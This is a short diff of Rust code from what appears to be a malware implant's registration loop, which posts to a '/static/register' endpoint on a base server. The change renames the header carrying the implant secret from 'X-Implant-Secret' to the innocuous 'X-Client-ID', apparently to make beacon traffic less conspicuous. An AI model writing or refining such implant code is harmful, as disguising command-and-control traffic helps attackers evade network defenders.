@@ -96,7 +96,7 @@ pub fn link_loop() {
     let mut x_req_id = loop {
         if let Ok(r) = client
             .post(format!("{}/static/register", base))
-            .header("X-Implant-Secret", IMPLANT_SECRET)
+            .header("X-Client-ID", IMPLANT_SECRET)
             .json(&reg)
             .send()
         {
